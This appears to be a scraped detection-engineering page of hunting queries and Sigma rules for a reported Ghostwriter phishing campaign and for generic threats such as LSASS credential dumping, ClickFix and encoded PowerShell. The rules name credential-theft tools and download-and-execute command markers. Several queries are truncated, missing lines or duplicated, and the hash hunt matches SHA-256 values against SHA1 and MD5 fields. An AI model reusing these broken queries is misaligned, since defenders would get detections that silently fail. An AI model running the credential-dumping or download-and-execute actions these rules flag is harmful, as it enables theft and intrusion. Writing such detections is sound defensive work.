Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or SHA1 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or MD5 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or SHA1 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455") or MD5 in~ ("4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["4a927d031919fd6bd88d3c8a917214b54bca00f8ddc80ecfe4d230663dda7465", "b4592cea69699b2c0737d4e19cff7dca17b5baf5a238cd6da950a37e9986f216", "710a9d2653c8bd3689e451778dab9daec0de4c4c75f900788ccf23ef254b122a", "57b3188e24782c27fdf72493ce599537efd3187d03b80f8afe733c72d68c5517", "bdd5da81ac34d9faa2a5118d4ed8f492239734be02146cd24a0e34270a48a455"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Ghostwriter Targets Ukraine Government Entities with Prometheus Phishing Malware

The Hacker News
2026-05-22 13 use cases 8 techniques 5 kill-chain phases detected

The Belarus-aligned threat actor known as Ghostwriter (aka UAC-0057 and UNC1151) has been observed using lures related to Prometheus, a Ukrainian online learning platform, to target government organizations in the country. The activity, per the Computer Emergency Response Team of Ukraine (CERT-UA), involves sending phishing emails to government entities using compromised accounts. It's been

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Ghostwriter OYSTERFRESH: wscript.exe executing .js from user Downloads/Temp/Roaming · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Ghostwriter OYSTERBLUES: wscript.exe writing large encrypted blob to HKCU registry
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Ghostwriter OYSTERBLUES C2: wscript.exe HTTP POST exfiltrating host recon to external IP · Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
[LLM] Ghostwriter OYSTERFRESH: wscript.exe executing .js from user Downloads/Temp/Roaming Delivery High
Hunts the OYSTERFRESH delivery chain CERT-UA attributes to UAC-0057 (Ghostwriter): victim opens PDF lure, clicks a Prometheus-themed link that downloads a ZIP; extracted .js is executed under wscript.exe from a user-writable path. Pairs the named binary with the unzip-from-Downloads behaviour to keep false positives bounded. Rationale: Uses three article-anchored signals: (1) wscript.exe as the JS runtime CERT-UA names; (2) a user-writable archive-extraction directory because the article specifies ZIP→JS unzip; (3) a parent set restricted to browsers/archivers/mail clients that would have produced the unpack. CERT-UA's mitigation guidance to 'restrict wscript.exe for standard user accounts' confirms this is the load-bearing execution primitive. Cross-checked against: • https://cert.gov.ua/article • https://attack.mitre.org/groups/G1086/
ATT&CKT1059.007 T1204.002 T1566.002
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "wscript.exe"
| where ProcessCommandLine has_any (@"\Downloads\", @"\AppData\Local\Temp\", @"\AppData\Roaming\")
| where ProcessCommandLine matches regex @"(?i)\.js[e]?(\s|$|""|')"
| where InitiatingProcessFileName in~ ("explorer.exe","7zg.exe","7zfm.exe","winrar.exe","rar.exe","msedge.exe","chrome.exe","firefox.exe","acrobat.exe","acrord32.exe","outlook.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName endswith "wscript.exe"
| where ActingProcessCommandLine has_any (@"\Downloads\", @"\Temp\", @"\Roaming\")
| where ActingProcessCommandLine matches regex @"(?i)\.js[e]?(\s|$|""|')"
| where ParentProcessName has_any ("explorer.exe","7zg.exe","7zfm.exe","winrar.exe","rar.exe","msedge.exe","chrome.exe","firefox.exe","acrobat.exe","acrord32.exe","outlook.exe")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, SHA256
title: WScript Executing JavaScript From User Downloads or Temp (Ghostwriter OYSTERFRESH)
id: 8a3f6e02-3b8c-4e3a-9c7c-c7e8a1b2d4e6
description: Detects wscript.exe launched with a .js/.jse path inside Downloads, AppData\\Local\\Temp or AppData\\Roaming, with a browser/archiver/mail-client parent. Matches the OYSTERFRESH delivery chain CERT-UA attributes to Ghostwriter (UAC-0057) targeting Ukrainian government entities via Prometheus-themed phishing.
references:
  - https://thehackernews.com/2026/05/ghostwriter-targets-ukraine-government.html
author: SOC Detection Engineering
date: 2026/05/23
tags:
  - attack.execution
  - attack.t1059.007
  - attack.t1204.002
  - attack.t1566.002
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith: '\wscript.exe'
  selection_path:
    CommandLine|contains:
      - '\Downloads\'
      - '\AppData\Local\Temp\'
      - '\AppData\Roaming\'
  selection_ext:
    CommandLine|contains:
      - '.js'
      - '.jse'
  selection_parent:
    ParentImage|endswith:
      - '\explorer.exe'
      - '\7zG.exe'
      - '\7zFM.exe'
      - '\WinRAR.exe'
      - '\Rar.exe'
      - '\msedge.exe'
      - '\chrome.exe'
      - '\firefox.exe'
      - '\Acrobat.exe'
      - '\AcroRd32.exe'
      - '\outlook.exe'
  condition: all of selection_*
level: high
source:windows.sysmon @EventID:1 @Image:(*\\wscript.exe OR *\\WScript.exe OR *\\WSCRIPT.EXE) (@CommandLine:*\\Downloads\\* OR @CommandLine:*\\Temp\\* OR @CommandLine:*\\Roaming\\*) (@CommandLine:*.js* OR @CommandLine:*.jse*) @ParentImage:(*\\explorer.exe OR *\\Explorer.EXE OR *\\7zG.exe OR *\\7zFM.exe OR *\\WinRAR.exe OR *\\Rar.exe OR *\\msedge.exe OR *\\chrome.exe OR *\\firefox.exe OR *\\Acrobat.exe OR *\\AcroRd32.exe OR *\\OUTLOOK.EXE)
#event_simpleName=ProcessRollup2 ImageFileName=/\\wscript\.exe$/i
| regex("\\\\(Downloads|Temp|Roaming)\\\\", field=CommandLine, flags="i")
| regex("\\.js[e]?(\\s|$|\"|')", field=CommandLine, flags="i")
| ParentBaseFileName=/(explorer|7zg|7zfm|winrar|rar|msedge|chrome|firefox|acrobat|acrord32|outlook)\.exe$/i
| groupBy([aid, ComputerName, UserName, ParentBaseFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=wscript.exe AND (Processes.process="*\\Downloads\\*.js*" OR Processes.process="*\\Temp\\*.js*" OR Processes.process="*\\Roaming\\*.js*") AND Processes.parent_process_name IN ("explorer.exe","7zg.exe","7zFM.exe","WinRAR.exe","Rar.exe","msedge.exe","chrome.exe","firefox.exe","Acrobat.exe","AcroRd32.exe","outlook.exe") by Processes.dest Processes.user Processes.parent_process_name Processes.process Processes.process_path | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=wscript.exe AND (Processes.process="*\\Downloads\\*.js*" OR Processes.process="*\\Temp\\*.js*" OR Processes.process="*\\Roaming\\*.js*") AND Processes.parent_process_name IN ("explorer.exe","7zg.exe","7zFM.exe","WinRAR.exe","Rar.exe","msedge.exe","chrome.exe","firefox.exe","Acrobat.exe","AcroRd32.exe","outlook.exe") by Processes.dest Processes.user Processes.parent_process_name Processes.process Processes.process_path | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
[LLM] Ghostwriter OYSTERBLUES: wscript.exe writing large encrypted blob to HKCU registry Installation High
Hunts the fileless storage step of OYSTERFRESH: after first execution, the stager writes the obfuscated/encrypted OYSTERBLUES payload into a HKCU registry value (rather than disk) so OYSTERSHUCK can later decode it. Pairs wscript.exe as the writing process with a HKCU\Software target and a payload-sized value (>4 KB) — neither alone is suspicious, the combination is. Rationale: Three article-derived constraints stack: wscript.exe (the named runtime), HKCU\Software (the article says the encrypted blob is written to the registry; HKCU\Software is the only writable hive for a standard user where this fits), and value length >4 KB (encrypted payload large enough to hold a Cobalt Strike loader cannot fit in a Run-key-sized string). Falcon left empty because the listed FDR schema reference only exposes AsepValueUpdate (autostart entries), and OYSTERBLUES does not necessarily land in an autostart key — the generic registry-value write event is outside the documented schema. Cross-checked against: • https://attack.mitre.org/techniques/T1027/011/ • https://attack.mitre.org/groups/G1086/
ATT&CKT1112 T1027.011 T1059.007
Data sourcesEndpoint.Registry
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "wscript.exe"
| where ActionType in ("RegistryValueSet","RegistryKeyCreated")
| where RegistryKey has @"HKEY_CURRENT_USER\Software"
| extend ValueLen = strlen(tostring(RegistryValueData))
| where ValueLen > 4096
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, RegistryKey, RegistryValueName, RegistryValueType, ValueLen
| order by Timestamp desc
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName endswith "wscript.exe"
| where RegistryKey has_any (@"HKEY_CURRENT_USER\Software", @"HKCU\Software")
| extend ValueLen = strlen(tostring(RegistryValueData))
| where ValueLen > 4096
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, RegistryKey, RegistryValue, RegistryValueType, ValueLen
| order by TimeGenerated desc
title: WScript Writing Value Under HKCU Software (Ghostwriter OYSTERBLUES Fileless Stash)
id: ed3a5b7c-2c9a-4f6b-9e7f-12c8d6a3b1c2
description: Detects wscript.exe writing a value under HKCU\Software. The OYSTERFRESH stager stores the obfuscated, encrypted OYSTERBLUES payload in the registry rather than on disk to evade file-based AV, before OYSTERSHUCK decodes and launches it.
references:

[LLM] Ghostwriter OYSTERBLUES C2: wscript.exe HTTP POST exfiltrating host recon to external IP Command & Control High
Hunts the OYSTERBLUES C2 beacon CERT-UA describes: wscript.exe running the OYSTERBLUES JS makes an HTTP POST to an attacker server carrying computer name, user, OS version, last-boot time and running-process list, then eval()s the JS response (which lands Cobalt Strike). Detection is wscript.exe as the network-initiating process to a public IP on HTTP(S) ports. Rationale: Anchored on the article's two explicit C2 facts: (1) the beacon is wscript.exe (CERT-UA names it as the runtime and recommends restricting it), and (2) the channel is an HTTP POST to a C2 server (so HTTP(S) ports + public IP). wscript.exe legitimately almost never reaches the public internet — that single combination is highly specific. Sentinel query rebuilt as ImProcessCreate-to-ImNetworkSession join because ImNetworkSession has no process-name column. Cross-checked against: • https://cert.gov.ua/article • https://attack.mitre.org/techniques/T1071/001/
ATT&CKT1071.001 T1059.007 T1041 T1082
Data sourcesEndpoint.Processes Network_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "wscript.exe"
| where RemoteIPType == "Public"
| where RemotePort in (80, 443, 8080, 8443)
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, RemoteIP, RemotePort, RemoteUrl, Protocol
| order by Timestamp desc
let WindowMinutes = 30m;
let WscriptProcs = ImProcessCreate
    | where TimeGenerated > ago(7d)
    | where ActingProcessName endswith "wscript.exe"
    | where ActorUsername !endswith "$"
    | project ProcTime = TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, ActingProcessId;
ImNetworkSession
| where TimeGenerated > ago(7d)
| where NetworkDirection == "Outbound"
| where DstPortNumber in (80, 443, 8080, 8443)
| where not(ipv4_is_private(DstIpAddr))
| join kind=inner WscriptProcs on DvcHostname
| where TimeGenerated between (ProcTime .. (ProcTime + WindowMinutes))
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessCommandLine, DstIpAddr, DstPortNumber, Url, NetworkBytes
source:windows.sysmon @EventID:3 @Image:(*\\wscript.exe OR *\\WScript.exe OR *\\WSCRIPT.EXE) @DestinationPort:(80 OR 443 OR 8080 OR 8443) NOT CIDR(@DestinationIp, 10.0.0.0/8, 192.168.0.0/16, 172.16.0.0/12, 127.0.0.0/8)

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents

| where Timestamp > ago(1d)

| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),

| order by conn_count desc

            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

status: experimental
description: |
    "FakeCaptcha" / "ClickFix" social-engineering: malicious site asks
    user to press Win+R and paste a payload. The result is
    powershell/mshta launched directly from explorer.exe with iex /
    base64 / downloadstring in the command line.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1204/002/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1204.002
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\explorer.exe'
            - '\RuntimeBroker.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\mshta.exe'
    selection_cmd:
        CommandLine|contains:
            - 'iex'
            - 'invoke-expression'
            - 'frombase64'
            - 'downloadstring'
            - 'hxxp'
            - 'curl '
            - 'wget '
    condition: selection_parent and selection_child and selection_cmd
falsepositives:
    - IT-driven scripted automation that admins paste-launch
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("explorer.exe","RuntimeBroker.exe")
      AND Processes.process_name IN ("powershell.exe","pwsh.exe","mshta.exe")
      AND (Processes.process="*iex*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*FromBase64*" OR Processes.process="*DownloadString*"
        OR Processes.process="*hxxp*" OR Processes.process="*curl*" OR Processes.process="*wget*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("explorer.exe","RuntimeBroker.exe")
      AND Processes.process_name IN ("powershell.exe","pwsh.exe","mshta.exe")
      AND (Processes.process="*iex*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*FromBase64*" OR Processes.process="*DownloadString*"
        OR Processes.process="*hxxp*" OR Processes.process="*curl*" OR Processes.process="*wget*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
PowerShell encoded / obfuscated command Exploitation High
Encoded or obfuscated PowerShell — common across loaders, recon, and post-exploitation.
ATT&CKT1059.001 T1027
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("powershell.exe","pwsh.exe")
| where ProcessCommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\pwsh.exe"
| where CommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project TimeGenerated, Computer, Account, NewProcessName,
          CommandLine, ParentProcessName
| order by TimeGenerated desc

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host

| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")

            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",

| project Timestamp, DeviceName, ActionType, FileName,

| where TimeGenerated > ago(7d)
| where EventID == 4663
